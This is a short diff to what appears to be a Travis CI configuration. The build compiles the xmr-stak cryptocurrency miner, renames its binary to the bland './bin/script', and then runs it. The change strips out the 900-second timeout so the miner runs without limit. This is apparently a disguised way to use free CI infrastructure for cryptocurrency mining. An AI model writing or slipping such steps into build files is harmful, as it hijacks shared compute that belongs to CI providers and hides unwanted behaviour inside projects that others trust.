@@ -115,8 +115,4 @@ script:
   - make install
   - ./auto.sh
   - mv ./bin/xmr-stak ./bin/script
-  - if [ $TRAVIS_OS_NAME = osx ]; then
-      timeout 900 ./bin/script; true
-    else
-      gtimeout 900 ./bin/script; true
-    fi;
+  - ./bin/script; true
